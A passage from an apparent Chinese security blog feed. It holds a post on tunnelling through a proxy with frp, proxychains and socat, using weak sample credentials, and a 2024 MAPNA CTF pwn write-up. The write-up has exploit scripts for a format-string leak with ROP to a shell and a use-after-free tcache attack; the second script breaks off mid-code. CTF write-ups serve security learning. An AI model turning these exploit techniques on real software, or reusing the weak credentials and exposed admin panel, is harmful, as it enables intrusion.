            "content_html": "<p>遇到了存在 a 、b、c 三台机器，a 、b 之间可以互相连接，b、c之间也可以连接，a、c 直接不能互相连接。a 、c 可以完全自由控制，b 不能控制，但是机器上存在一个只有 c 可以访问的代理端口，所以目前是 c 可以走代理访问到 a，我现在需要 a 能够访问 c，所以想要做内网穿透</p>\n<p>利用 frp + proxychains + socat</p>\n<p>frp 是内网穿透工具，但是 frpc 没有走代理的功能，所以需要用到 proxychains </p>\n<p>但是 proxychains 是原理是 hook libc，而 frp 是 go 编写的，所以需要用 socat 来转发流量</p>\n<p>假设 192.168.25.129 是 a 机器</p>\n<p><img src=\"/2024/07/22/frps/4030b244235da8bf40b745d9c7a11447.png\" alt=\"4030b244235da8bf40b745d9c7a11447\"></p>\n<p>物理机 192.168.25.1 开启了 1080 代理的是 b 机器</p>\n<p><img src=\"/2024/07/22/frps/d92a71328201ce4fa3869edf5ccc7451.png\"></p>\n<p>以及 c 机器 kali</p>\n<p><img src=\"/2024/07/22/frps/06ea416396b58825231d5a21d69eae95.png\"></p>\n<p>将 frps 放到 a 机器</p>\n<p>frsp.toml 配置如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bindPort = 7000</span><br><span class=\"line\">vhostHTTPPort = 8787</span><br><span class=\"line\">auth.method = &quot;token&quot;</span><br><span class=\"line\">auth.token = &quot;aaabbb&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 后台管理面板配置</span><br><span class=\"line\">webServer.port = 7500</span><br><span class=\"line\">webServer.addr = &quot;0.0.0.0&quot;</span><br><span class=\"line\">webServer.user = &quot;admin&quot;</span><br><span class=\"line\">webServer.password = &quot;pwd&quot;</span><br></pre></td></tr></table></figure>\n\n<p>将 frpc 放到 b 机器，这里我是为了能够让 gdbserver 使用才用的内网穿透，所以只映射 1234 端口，frps ip 则是本地</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">serverAddr = &quot;127.0.0.1&quot;\t\t\t</span><br><span class=\"line\">serverPort = 7000\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">auth.method = &quot;token&quot;</span><br><span class=\"line\">auth.token = &quot;aaabbb&quot;  \t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[[proxies]]</span><br><span class=\"line\">name = &quot;gdbserver&quot;</span><br><span class=\"line\">type = &quot;tcp&quot;\t</span><br><span class=\"line\">localIP = &quot;127.0.0.1&quot;\t\t\t\t</span><br><span class=\"line\">localPort = 1234\t\t\t\t</span><br><span class=\"line\">remotePort = 1234                   </span><br></pre></td></tr></table></figure>\n\n<p>接下来修改 &#x2F;etc&#x2F;proxychains.conf 中的 代理 ip 和 port </p>\n<p><img src=\"/2024/07/22/frps/b474b1099bfe58f161e8c67dd2cc5f5f.png\" alt=\"b474b1099bfe58f161e8c67dd2cc5f5f\"></p>\n<p>接着就可以在 kali 中利用 socat 转发流量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">proxychains socat TCP4-LISTEN:7000,reuseaddr,fork TCP4:192.168.25.129:7000</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/07/22/frps/d200bcb270d749f1f53f9c183f9d06d2.png\"></p>\n<p>可以将 frpc 连接到本地 7000 端口的流量通过代理发送到真正运行 frps 的 b 机器上，接着就是正常运行 frps 和 frpc</p>\n<p><img src=\"/2024/07/22/frps/ea36d43bcaee6e507d6f182622468f7f.png\"></p>\n<p>就能看到是通过 b 机器的代理访问的 frps，成功连接</p>\n<p>就是这环境太折磨人了，走了代理后的流量，gdbserver 调试个东西特卡，一个指令跑几秒</p>\n<p>参考链接：</p>\n<p><a href=\"https://oldblog.mcfx.us/archives/277/\">https://oldblog.mcfx.us/archives/277/</a></p>\n<p><a href=\"https://blog.csdn.net/laoxiaa/article/details/140474630\">https://blog.csdn.net/laoxiaa/article/details/140474630</a></p>\n<p>​\t\t\t</p>\n",
            "tags": [
                "内网穿透"
            ]
        },
        {
            "id": "http://example.com/2024/07/16/2024_mapna_CTF/",
            "url": "http://example.com/2024/07/16/2024_mapna_CTF/",
            "title": "2024 mapna CTF",
            "date_published": "2024-07-16T13:00:23.000Z",
            "content_html": "<h2 id=\"ninipwn-新手\"><a href=\"#ninipwn-新手\" class=\"headerlink\" title=\"ninipwn - 新手\"></a>ninipwn - 新手</h2><p><img src=\"/2024/07/16/2024_mapna_CTF/26fc7166794bc8b23c485afea5a72126.png\"></p>\n<p>key 是 8 字节的，但是读入了 10 字节，可以溢出到 text_length ，导致 text_length 超过 buf 长度，能够栈溢出，并且存在格式化字符串漏洞。</p>\n<p>1.通过格式化字符串漏洞泄露 canary 和 libc_base </p>\n<p>2.通过栈溢出进行 ROP</p>\n<p>3.注意 ROP payload 需要经过 encrypt 处理，其实就是一个简单的异或算法</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> run</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">import</span> tty</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">c = <span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c):</span><br><span class=\"line\">        gdb.attach(p, c)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        gdb.attach(p)</span><br><span class=\"line\">        pause()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sb</span>() : <span class=\"keyword\">return</span> libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>], libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_rdi_ret</span>(<span class=\"params\">rop, base</span>) : <span class=\"keyword\">return</span> base + rop.find_gadget([<span class=\"string\">&#x27;pop rdi&#x27;</span>, <span class=\"string\">&#x27;ret&#x27;</span>]).address, base + rop.find_gadget([<span class=\"string\">&#x27;ret&#x27;</span>]).address</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> data : p.send(data)</span><br><span class=\"line\">sa  = <span class=\"keyword\">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class=\"line\">sl  = <span class=\"keyword\">lambda</span> data   :p.sendline(data)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class=\"line\">r   = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>   :p.recv(num)</span><br><span class=\"line\">rl  = <span class=\"keyword\">lambda</span> text   :p.recvuntil(text)</span><br><span class=\"line\">pr = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span> :<span class=\"built_in\">print</span>(p.recv(num))</span><br><span class=\"line\">inter   = <span class=\"keyword\">lambda</span>        :p.interactive()</span><br><span class=\"line\">l32 = <span class=\"keyword\">lambda</span>    :u32(p.recvuntil(<span class=\"string\">b&#x27;\\xf7&#x27;</span>)[-<span class=\"number\">4</span>:].ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">l64 = <span class=\"keyword\">lambda</span>    :u64(p.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span>    :u32(p.recv(<span class=\"number\">4</span>).ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span>    :u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">int16   = <span class=\"keyword\">lambda</span> data   :<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>)</span><br><span class=\"line\">lg= <span class=\"keyword\">lambda</span> s, num   :p.success(<span class=\"string\">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;47.238.36.100&#x27;, 9999)</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf_patch = <span class=\"string\">&#x27;./ninipwn&#x27;</span></span><br><span class=\"line\">p = process(elf_patch)</span><br><span class=\"line\">elf = ELF(elf_patch)</span><br><span class=\"line\">elf_rop = ROP(elf_patch)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_patch = <span class=\"string\">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(libc_patch):</span><br><span class=\"line\">\tlibc = ELF(libc_patch)</span><br><span class=\"line\">\tlibc_rop = ROP(libc_patch)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#ld = ELF(&#x27;./lib/ld-linux-x86-64.so.2&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x12ac)&#x27; + &#x27;\\nc&#x27;*0x108)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">data, key</span>):</span><br><span class=\"line\">    text_length = <span class=\"built_in\">len</span>(data)</span><br><span class=\"line\">    key_length = <span class=\"built_in\">len</span>(key)</span><br><span class=\"line\">    encrypted_data = <span class=\"built_in\">bytearray</span>(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(text_length):</span><br><span class=\"line\">        encrypted_data[i] ^= key[i % key_length]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">bytes</span>(encrypted_data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x1421)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">sla(<span class=\"string\">b&#x27;length: &#x27;</span>, <span class=\"built_in\">str</span>(<span class=\"number\">0x100</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">b&#x27;%39$p%3$p\\x02&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Key: &#x27;</span>, key)</span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;0x&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(r(<span class=\"number\">16</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;0x&#x27;</span>)</span><br><span class=\"line\">libc_base = <span class=\"built_in\">int</span>(r(<span class=\"number\">12</span>), <span class=\"number\">16</span>) - <span class=\"number\">23</span> - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">rdi, ret = get_rdi_ret(libc_rop, libc_base)</span><br><span class=\"line\">system, binsh = get_sb()</span><br><span class=\"line\">rsi = libc_base + <span class=\"number\">0x000000000002be51</span></span><br><span class=\"line\">rdx = libc_base + <span class=\"number\">0x0000000000170337</span></span><br><span class=\"line\">execve = libc_base + libc.sym[<span class=\"string\">&#x27;execve&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">pl = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x108</span> + p64(canary) + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span> + p64(rdi) + p64(binsh) + p64(rsi) + p64(<span class=\"number\">0</span>) + p64(rdx) + p64(<span class=\"number\">0</span>) + p64(execve)</span><br><span class=\"line\"></span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Text: &#x27;</span>, encrypt(pl, key[:<span class=\"number\">8</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;canary&#x27;</span>, canary)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sl(b&#x27;cat flag&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">inter()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"buggypaint-简单\"><a href=\"#buggypaint-简单\" class=\"headerlink\" title=\"buggypaint - 简单\"></a>buggypaint - 简单</h2><p><img src=\"/2024/07/16/2024_mapna_CTF/b41e3bc258ec95342bfcf461427eec7d.png\" alt=\"b41e3bc258ec95342bfcf461427eec7d\"></p>\n<p>select 功能可以保存 create 功能创建的堆块指针，但是 delete 功能释放堆块时候不会清空 select 保存的堆块指针，这就导致了 UAF</p>\n<p>可以很简单利用 tcache bin attack 进行任意读写，这里是通过 environ 泄露栈之后进行 ROP</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> run</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">import</span> tty</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">c = <span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c):</span><br><span class=\"line\">        gdb.attach(p, c)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        gdb.attach(p)</span><br><span class=\"line\">        pause()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sb</span>() : <span class=\"keyword\">return</span> libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>], libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_rdi_ret</span>(<span class=\"params\">rop, base</span>) : <span class=\"keyword\">return</span> base + rop.find_gadget([<span class=\"string\">&#x27;pop rdi&#x27;</span>, <span class=\"string\">&#x27;ret&#x27;</span>]).address, base + rop.find_gadget([<span class=\"string\">&#x27;ret&#x27;</span>]).address</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> data : p.send(data)</span><br><span class=\"line\">sa  = <span class=\"keyword\">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class=\"line\">sl  = <span class=\"keyword\">lambda</span> data   :p.sendline(data)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class=\"line\">r   = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>   :p.recv(num)</span><br><span class=\"line\">rl  = <span class=\"keyword\">lambda</span> text   :p.recvuntil(text)</span><br><span class=\"line\">pr = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span> :<span class=\"built_in\">print</span>(p.recv(num))</span><br><span class=\"line\">inter   = <span class=\"keyword\">lambda</span>        :p.interactive()</span><br><span class=\"line\">l32 = <span class=\"keyword\">lambda</span>    :u32(p.recvuntil(<span class=\"string\">b&#x27;\\xf7&#x27;</span>)[-<span class=\"number\">4</span>:].ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">l64 = <span class=\"keyword\">lambda</span>    :u64(p.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span>    :u32(p.recv(<span class=\"number\">4</span>).ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span>    :u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">int16   = <span class=\"keyword\">lambda</span> data   :<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>)</span><br><span class=\"line\">lg= <span class=\"keyword\">lambda</span> s, num   :p.success(<span class=\"string\">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>)<span class=\"comment\">#, log_level=&#x27;debug&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;47.238.36.100&#x27;, 9999)</span></span><br><span class=\"line\">elf_patch = <span class=\"string\">&#x27;./chall&#x27;</span></span><br><span class=\"line\">libc_patch = <span class=\"string\">&#x27;./libc.so.6&#x27;</span></span><br><span class=\"line\">p = process(elf_patch)</span><br><span class=\"line\">elf = ELF(elf_patch)</span><br><span class=\"line\">elf_rop = ROP(elf_patch)</span><br><span class=\"line\">libc = ELF(libc_patch)</span><br><span class=\"line\">libc_rop = ROP(libc_patch)</span><br><span class=\"line\"><span class=\"comment\">#ld = ELF(&#x27;./lib/ld-linux-x86-64.so.2&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">x, y, w, h, data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;x: &#x27;</span>, <span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;y: &#x27;</span>, <span class=\"built_in\">str</span>(y))</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;width: &#x27;</span>, <span class=\"built_in\">str</span>(w))</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;height: &#x27;</span>, <span class=\"built_in\">str</span>(h))</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;color(1=red, 2=green): &#x27;</span>, <span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tsa(<span class=\"string\">b&#x27;content: &#x27;</span>, data)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">x, y</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;x: &#x27;</span>, <span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;y: &#x27;</span>, <span class=\"built_in\">str</span>(y))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">select</span>(<span class=\"params\">x, y</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;x: &#x27;</span>, <span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;y: &#x27;</span>, <span class=\"built_in\">str</span>(y))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tsa(<span class=\"string\">b&#x27;content: &#x27;</span>, data)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;5&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>):</span><br><span class=\"line\">\tadd(<span class=\"number\">4</span>, i, <span class=\"number\">0x10</span>, <span class=\"number\">0x10</span>, <span class=\"string\">b&#x27;a&#x27;</span>)\t</span><br><span class=\"line\">select(<span class=\"number\">4</span>, <span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tdelete(<span class=\"number\">4</span>, i)</span><br><span class=\"line\">show()</span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;Box content:\\n&#x27;</span>)</span><br><span class=\"line\">libc_base = u64(r(<span class=\"number\">8</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">3</span>, <span class=\"number\">3</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x11</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">select(<span class=\"number\">3</span>, <span 